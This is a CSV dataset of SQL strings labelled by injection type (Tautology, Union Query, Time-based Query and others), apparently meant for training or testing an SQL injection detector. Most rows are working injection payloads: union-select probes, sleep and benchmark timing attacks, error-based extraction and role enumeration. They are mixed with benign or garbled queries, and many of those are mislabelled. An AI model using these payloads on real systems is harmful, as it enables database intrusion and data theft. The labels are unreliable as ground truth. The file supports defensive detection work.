knownpatterns,category
"""-3316%"""" or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   \::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and """"%""""  =  """"""",Tautology
SELECT * FROM fifteen WHERE rice BETWEEN '1996-07-01' AND '1996-07-31',Tautology
""" SELECT LPAD ( CustomerName, 30, """"ABC"""" )  AS LeftPadCustomerName FROM Customers; """,Tautology
-4363%'   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  '%'  =  ',Tautology
SELECT * FROM women 3 SELECT * FROM place,Tautology
"""-9405'  )   union all select 8283,8283,8283,8283--""",Union Query
1%'   )    )     )   union all select null#,Union Query
SELECT * FROM positive,Tautology
SELECT AVG ( future )  FROM desk  SELECT SUM ( began ) ,Illegal/Logically incorrect query
"""1' where 8860  =  8860 and extractvalue  (  7982,concat  (  0x5cx7171706a71,  (  select   (  elt  (  7982  =  7982   )    )     )  x717a767a71   )    )   --""",Alternate Encoding
"""select dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  70  )  ||chr  (  106  )  ||chr  (  78  )  ,5  )   from dual--""",Tautology
"""1"""" where 4345  =  4345 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --""",Tautology
"""1""""   )    )    as gbxx where 2459  =  2459 waitfor delay '0:0:5'--""",Time-based Query
"""-9751""""   )    )     )   or 5929  =  3884--""",Tautology
SELECT * FROM individual WHERE blind BETWEEN '1996-07-01' AND '1996-07-31',Tautology
admin'  )   or '1'  =  '1'/*,Tautology
SELECT * FROM yet WHERE point NOT LIKE 'breeze%',Alternate Encoding
SELECT TOP 3 * FROM rapidly SELECT * FROM practical 3SELECT * FROM during,Tautology
"""   SELECT journey, also, scientificFROM fence WHERE broad  IS NOT NULL""",Tautology
SELECT * FROM have FETCH FIRST 50 PERCENT ROWS ONLY,Tautology
WHERE 1=1 AND 1=1--,Tautology
SELECT AVG ( necessary ) FROM fat SELECT SUM ( appropriate ) ,Illegal/Logically incorrect query
') or pg_sleep(__TIME__)--,Time-based Query
1'   )    )    and 9198  =  9198--,Tautology
"""1'+  (  select 'uijv' where 7279  =  7279 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --""",Tautology
"""1  )   as ocut where 6800  =  6800 and elt  (  4249  =  4249,7259  )  --""",Tautology
SELECT COUNT ( firm ) FROM element,Illegal/Logically incorrect query
"""1""""  )   where 3058  =  3058 union all select null--""",Union Query
"""1'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  'xjvr'  =  'xjvr""",Illegal/Logically incorrect query
"""INSERT INTO automobile ( cry, strange, cost, though, wise, original )  VALUES  ( 'nobody', 'price'. zero', 'table', 'fully', 'tool', 'loose' )  """,Alternate Encoding
"""-5969"""" where 9248  =  9248 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --""",Tautology
SELECT * FROM breakfast WHERE simplest BETWEEN taste09/01/1996plastic AND event15/31/1996because,Tautology
"""-7111%"""" union all select 6083,6083,6083,6083,6083,6083--""",Union Query
SELECT Count ( * )  AS is,Illegal/Logically incorrect query
"""SELECT * FROM heard WHERE certainly BETWEEN """"place"""" AND    """"ruler""""""",Tautology
""" AND 1=  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i""",Tautology
SELECT * FROM onto WHERE in BETWEEN '1996-07-01' AND '1996-07-31',Tautology
"""1""""  )   where 1699=1699 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --""",Illegal/Logically incorrect query
declare @s varchar   (  8000  )   select @s   =   0x73656c65637420404076657273696f6e,Alternate Encoding
SELECT TOP 3 * FROM village WHERE dirty = 'possible' SELECT * FROM minerals,Illegal/Logically incorrect query
"""1' or updatexml  (  1808,concat  (  0x2ex7171706a71,  (  select   (  elt  (  1808=1808   )    )     )  x717a767a71  )  ,8666  )   and 'esjl'  =  'esjl""",Alternate Encoding
"""-2430'  )   union all select 5712,5712,5712,5712,5712,5712,5712,5712,5712,5712--""",Union Query
1'  )   where 6244  =  6244 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,Time-based Query
SELECT * FROM common WHERE equipment = 'sleep' FETCH FIRST 3 ROWS ONLY,Time-based Query
SELECT * FROM bell WHERE sheep = 'accurate'  AND  ( steel = 'drive' OR column = 'mouth' ) ,Tautology
""" SELECT * FROM possibly ORDER BY concerned ASC, could DESC""",Tautology
SELECT TOP 50 PERCENT * FROM widely,Tautology
SELECT * FROM met WHERE even = 'certainly'  OR property = 'consonant',Tautology
"""INSERT INTO feature  ( solar, likely, quietly )  VALUES  ( 'shot', 'rest', 'floor' )  """,Illegal/Logically incorrect query
SELECT COUNT ( affect ) FROM headed,Illegal/Logically incorrect query
"""-2204'||  (  select 'bwae' from dual where 4884  =  4884 union all select 4884,4884,4884,4884,4884,4884,4884,4884,4884,4884#""",Union Query
"""-9860  )   where 8743  =  8743 union all select 8743,8743,8743,8743,8743,8743,8743--""",Union Query
SELECT fed ( s )  FROM increase SELECT reader FROM myself,Tautology
"""  SELECT raceID AS ID, common AS signal FROM mouse""",Tautology
' or user like '%,Tautology
"""-4477'   )    )    union all select 8444,8444,8444,8444,8444,8444,8444,8444--""",Union Query
"""1   )    )    union all select null,null--""",Union Query
1'+  (  select 'mzee' where 5984  =  5984,Tautology
"""1%""""   )    )    and elt  (  7633  =  4110,4110  )   and    (    (   """"%""""  =  """"""",Tautology
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15--",Time-based Query
"""1'  )   where 6214  =  6214 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )    )  --""",Stored Procedure
""" SELECT City, Country FROM Customers WHERE Country = 'Germany' UNION """,Union Query
"""1""""   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #""",Time-based Query
1'   )    )    and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   \::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   'yhku' like 'yhku,Tautology
"""1"""" where 5098  =  5098 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   \::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --""",Tautology
SELECT * FROM down WHERE child NOT LIKE '[question]%',Tautology
SELECT Count ( * )  AS instant,Illegal/Logically incorrect query
SELECT * FROM your WHERE lost  BETWEEN 10 AND 20,Tautology
"""select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   """"zzmn""""  =  """"zzmn""",Illegal/Logically incorrect query
"""  SELECT wheat AS power, railroad AS [entirely]  FROM character""",Alternate Encoding
"""1'  )   where 8268  =  8268 union all select null,null,null,null--""",Union Query
SELECT * FROM  ( SELECT newspaper FROM dead ) ,Tautology
"""   SELECT COUNT ( blanket ) , took FROM none BY seat""",Illegal/Logically incorrect query
"""-7746'  )   union all select 1998998998998998998998998#""",Union Query
SELECT AVG ( conversation ) FROM plenty,Illegal/Logically incorrect query
SELECT * FROM struggle WHERE until IN  ( SELECT hot FROM happen ) ,Tautology
"""-2803""""  )   union all select 5337,5337,5337,5337,5337,5337,5337#""",Union Query
SELECT MIN ( purpose )  AS caught FROM throughout,Illegal/Logically incorrect query
"""  SELECT battle,expect,none FROM stranger LEFT JOIN Orders ON substance.roarID =  time.special ORDER BY dead.mainly""",Tautology
SELECT swam ( s )  FROM diagram UNION ALL,Union Query
"""1""""  )   where 6138  =  6138 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --""",Time-based Query
"""   SELECT Employees.fact, COUNT ( Orders.studyingID )  AS ponyFROM    ( OrdersINNER JOIN studied ON Orders.resultID  =  Employees.vastID ) """,Illegal/Logically incorrect query
"""  SELECT direction,engine FROM kitchen WHERE want = 'yes' UNION SELECT shut, even FROM behavior""",Union Query
1 where 6500  =  6500,Tautology
SELECT AVG ( position ) FROM understanding,Illegal/Logically incorrect query
SELECT RAND (  ) * ( 10-5 ) +5;,Tautology
"""1%""""   )    )    union all select null,null,null,null,null,null,null,null,null--""",Union Query
select sleep  (  5   )    )   ||',Time-based Query
"""  SELECT ourselves,lack FROM lose WHERE history = 'asleep' UNION SELECT bill, stood FROM terrible""",Union Query
"""1 union all select null,null,null,null#""",Union Query
"""1""""  )   as tnux where 4888  =  4888 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #""",Time-based Query
SELECT * FROM officer WHERE cutting = 'involved' LIMIT 3,Tautology
SELECT * FROM  ( SELECT machine FROM combine ) ,Tautology
"""1%"""" rlike sleep  (  5  )  #""",Time-based Query
SELECT COUNT ( cross )  FROM grabbed,Illegal/Logically incorrect query
FROM  ( SELECT DISTINCT mysterious FROM rod ) ,Tautology
SELECT ten ( s )  FROM stop UNION,Union Query
1%'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,Time-based Query
SELECT CURRENT_DATE (  )  + 1;,Tautology
SELECT COUNT ( mind ) FROM except,Illegal/Logically incorrect query
SELECT * FROM winter,Alternate Encoding
"""1'  )   where 3262  =  3262 union all select null,null,null,null,null,null,null,null,null,null#""",Union Query
ORDER BY 21--,Tautology
"""1""""  )   where 7471=  7471 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )    )  ,500000000  )  ,null  )  --""",Illegal/Logically incorrect query
1'+  (  select 'lpkv' where 8760  =  8760,Tautology
"""1' in boolean mode  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #""",Alternate Encoding
"select * from users where id  =  '1' + $+%$ or 1=1-- 1""'",Tautology
SELECT poet ( s )  FROM written LEFT JOIN,Tautology
x' and 1=    (  select count  (  *  )   from tabname  )  ; --,Illegal/Logically incorrect query
""" select * from users where id=1 or """"?;"""" or 1=1-- 1""""",Tautology
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq   )    )   ||',Time-based Query
SELECT * FROM settlers WHERE prize NOT LIKE '[glass]%',Tautology
"""1%""""  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  """"%""""  =  """"""",Alternate Encoding
SELECT * FROM origin 3,Tautology
" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18",Time-based Query
SELECT TOP 50 PERCENT * FROM differ,Tautology
"""  SELECT fifth,split,stream FROM member LEFT JOIN Orders ON together.additionalID =  sad.small ORDER BY copy.gray""",Tautology
SELECT * FROM pattern WHERE note = 'past',Tautology
or a=a--,Tautology
"""  SELECT weather AS event, production AS [inch]  FROM never""",Tautology
SELECT AVG ( black ) FROM problem,Illegal/Logically incorrect query
"""-5800""""  )   or 6872  =  6872 and   (  """"tcab"""" like """"tcab""",Tautology
SELECT AVG ( direct ) FROM scared,Illegal/Logically incorrect query
"""- 1418""""  )   where 7528  =  7528 order by 1#""",Tautology
"""  SELECT * FROM bite WHERE weigh NOT IN  ( 'drive', 'avoid', 'free' )  """,Tautology
"""1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --""",Illegal/Logically incorrect query
"""-5624' union all select 3723,3723,3723,3723,3723--""",Union Query
"""1%'  )   union all select null,null#""",Union Query
 -- &password  = ,Tautology
"""INSERT INTO town  ( continued, order, would )  VALUES  ( 'sell', 'cake', 'industrial' )  """,Alternate Encoding
"""  SELECT * FROM layers WHERE dropped IN  ( 'cold', 'population', 'path' )  """,Piggy-Backed Query
-9950' or 4425=1975,Tautology
-6222   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   3230  =  3230,Tautology
SELECT COUNT ( somebodyID ) FROM broken,Illegal/Logically incorrect query
"""-4473'  )   union all select 7656,7656#""",Union Query
SELECT TOP 50 PERCENT * FROM brother,Tautology
"""1' and extractvalue  (  7982,concat  (  0x5cx7171706a71,  (  select   (  elt  (  7982  =  7982   )    )     )  x717a767a71   )    )    and 'cipk'  =  'cipk""",Alternate Encoding
"""1  )   as zdym where 1578=1578 union all select null,null,null#""",Union Query
1'+  (  select 'vnue' where 5807  =  5807,Tautology
-2050' union all select 5606#,Union Query
SELECT doubt ( s ) FROM copy INNER JOIN,Tautology
SELECT * FROM topic WHERE came = 'mixture' LIMIT 3,Tautology
"""select pg_sleep  (  5  )   and   (  """"%""""  =  """"""",Time-based Query
SELECT * FROM everyone 3,Tautology
" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17#",Time-based Query
1'  )   as bscn where 6907  =  6907,Tautology
DELETE FROM physical,Tautology
"""1""""  )   and 4241=  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241=  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  """"kkim""""  =  """"kkim""",Alternate Encoding
ORDER BY 20#,Tautology
SELECT volume ( s ) FROM field INNER JOIN,Tautology
 OR 1=0#,Inference
SELECT * FROM  ( SELECT motion FROM sum ) ,Illegal/Logically incorrect query
""" SELECT * FROM Customers  WHERE Country IN  ( 'Germany', 'France', 'UK' ) ;""",Illegal/Logically incorrect query
SELECT * FROM mighty WHERE NOT guard = 'distance'  AND NOT far = 'government',Tautology
"""  UPDATE making SET had =  'know', City =  'means' WHERE mind =  object""",Illegal/Logically incorrect query
SELECT COUNT ( several ) FROM stems,Illegal/Logically incorrect query
"""1'||  (  select 'cqjw' from dual where 7335  =  7335 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   ||'""",Illegal/Logically incorrect query
1  )   where 7050  =  7050,Tautology
"""1""""  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --""",Illegal/Logically incorrect query
SELECT * FROM she 3 SELECT * FROM further,Tautology
SELECT * FROM rice WHERE Price NOT BETWEEN 10 AND 20,Tautology
""" select * from users where id=1 or """",,""""=1 or 1=1-- 1""""",Tautology
group by userid having 1=1--,Tautology
"""  SELECT * FROM follow WHERE elephant IN  ( 'solve', 'four', 'throat' )  """,Tautology
"""1%""""   )    )     )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )    )  ,5000000000  )  ,null  )  --""",Illegal/Logically incorrect query
SELECT * FROM tin WHERE row NOT LIKE '[supper]%',Tautology
select   (  case when   (  6859  =  6507  )   then 6859 else 6859*  (  select 6859 from mysql.db  )   end  )  #,Tautology
"""1""""  )   as nfpe where 2679  =  2679""",Tautology
SELECT total ( s )  FROM gold FULL OUTER JOIN,Tautology
-9327'  )   or 3038  =  3038,Tautology
- 1011 or 7140  =  9977--,Tautology
"""INSERT INTO behavior  ( becoming, bound, aloud )  VALUES  ( 'nearby', 'business', 'party' )  """,Illegal/Logically incorrect query
1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  'nqol'  =  'nqol,Time-based Query
SELECT continent ( s ) FROM ice INNER JOIN,Tautology
""" select * from users where id=1.&&@ union select 1,version  (    )   -- 1""",Union Query
"""-4182   )    )    as wkfh where 6145  =  6145 union all select 6145,6145,6145,6145,6145#""",Union Query
"""1""""   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  """"fogb"""" like """"fogb""",Tautology
"""1   )    )    or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --""",Tautology
"""-6848""""   )    )    or 4071=  5312""",Tautology
SELECT * FROM  ( SELECT fresh FROM left ) ,Tautology
1 and sleep  (  5  ) ,Time-based Query
"""1"""" and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and """"hcjz"""" like """"hcjz""",Illegal/Logically incorrect query
